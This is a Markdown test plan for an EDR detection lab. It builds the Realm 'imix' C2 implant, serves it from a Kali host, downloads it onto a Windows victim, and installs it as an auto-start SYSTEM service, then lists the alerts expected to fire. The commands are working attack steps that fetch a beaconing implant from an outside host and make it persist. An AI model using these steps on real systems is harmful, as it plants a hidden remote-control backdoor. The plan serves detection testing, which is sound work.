# Test: Persistence — malicious Windows service (T1543.003)

**Chain:** the `win_service` build of imix installed as an auto-start service — beaconing
from SYSTEM context across reboots.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release --features win_service
cp target/release/imix.exe ~/sideload-lab/imix_svc.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
Invoke-WebRequest http://172.16.69.109:8000/imix_svc.exe -OutFile C:\Users\Public\imix_svc.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).


```bash
cd ~/realm/implants/imix
IMIX_CALLBACK_URI=http://<KALI_IP>:8080 cargo build --release --features win_service
cp target/release/imix.exe ~/sideload-lab/imix_svc.exe && python3 -m http.server 8000
```

**Victim (elevated PowerShell):** `.\test.ps1 -Kali 172.16.69.109`

```powershell
IWR http://172.16.69.109:8000/imix_svc.exe -OutFile C:\Users\Public\imix_svc.exe
sc.exe create CCDCTestSvc binPath= "C:\Users\Public\imix_svc.exe" start= auto
sc.exe start CCDCTestSvc
```

**Expected alerts:**

| Rule | Sev | Trigger | Latency |
|---|---|---|---|
| `SIG-*` | crit/high | on-write scan of imix_svc.exe | ≤60s |
| `EVT-7045` | critical | System log: service install | seconds |
| `PERS-SERVICE` | critical | auditor baseline diff | ≤30s |
| `NET-BEACON` | critical | SYSTEM-context callbacks | ~1-2 min |

**Note:** the only persistence method where the artifact beacons from `SYSTEM` — check the
beacon alert's process context on the console.

**Cleanup:** global cleanup removes the service; manually: `sc.exe delete CCDCTestSvc`.
